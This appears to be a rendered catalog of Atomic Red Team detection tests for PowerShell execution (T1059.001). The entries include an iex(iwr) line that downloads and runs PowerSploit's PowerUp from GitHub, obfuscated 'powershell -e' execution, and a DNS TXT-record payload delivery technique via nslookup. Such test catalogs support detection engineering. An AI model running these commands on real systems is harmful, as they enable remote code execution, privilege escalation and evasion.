<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 686a9785-f99b-41d4-90df-66ed515f81d7</li>
<li><strong>name</strong>: ATHPowerShellCommandLineParameter -Command parameter variations</li>
<li><strong>description</strong>: Executes powershell.exe with variations of the -Command parameter</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop</li>
<li><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1c0a870f-dc74-49cf-9afc-eccc45e58790</li>
<li><strong>name</strong>: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments</li>
<li><strong>description</strong>: Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop</li>
<li><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 86a43bad-12e3-4e85-b97c-4d5cf25b95c3</li>
<li><strong>name</strong>: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations</li>
<li><strong>description</strong>: Executes powershell.exe with variations of the -EncodedCommand parameter</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop</li>
<li><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0d181431-ddf3-4826-8055-2dbf63ae848b</li>
<li><strong>name</strong>: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments</li>
<li><strong>description</strong>: Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop</li>
<li><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a538de64-1c74-46ed-aa60-b995ed302598</li>
<li><strong>name</strong>: PowerShell Command Execution</li>
<li>
<p><strong>description</strong>: Use of obfuscated PowerShell to execute an arbitrary command; outputs "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report by Red Canary.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: powershell.exe -e  #{obfuscated_code}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 49eb9404-5e0f-4031-a179-b40f7be385e3</li>
<li><strong>name</strong>: PowerShell Invoke Known Malicious Cmdlets</li>
<li><strong>description</strong>: Powershell execution of known Malicious PowerShell Cmdlets</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $malcmdlets = #{Malicious_cmdlets}
foreach ($cmdlets in $malcmdlets) {
    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1289f78d-22d2-4590-ac76-166737e1811b</li>
<li><strong>name</strong>: PowerUp Invoke-AllChecks</li>
<li>
<p><strong>description</strong>: Check for privilege escalation paths using PowerUp from PowerShellMafia</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 999bff6d-dc15-44c9-9f5c-e1051bfc86e1</li>
<li><strong>name</strong>: Abuse Nslookup with DNS Records</li>
<li>
<p><strong>description</strong>: Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.
<a href="https://twitter.com/jstrosch/status/1237382986557001729">reference</a></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: # creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"</li>
</ul>
<h1>this would not be part of a real attack but helpful for this simulation</h1>
<p>function nslookup  { &amp;"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1059.001</li>
